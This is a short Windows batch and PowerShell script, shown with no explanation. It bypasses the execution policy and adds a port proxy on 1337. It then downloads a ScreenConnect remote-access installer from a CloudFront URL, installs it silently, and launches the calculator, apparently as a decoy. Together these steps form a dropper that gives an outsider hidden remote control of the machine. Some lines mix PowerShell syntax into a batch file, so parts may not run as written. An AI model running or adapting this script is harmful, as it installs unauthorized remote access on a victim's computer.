@echo Off
powershell.exe -ExecutionPolicy Bypass -C "netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1"
$installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"; Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"; msiexec /i $installer /qn
calc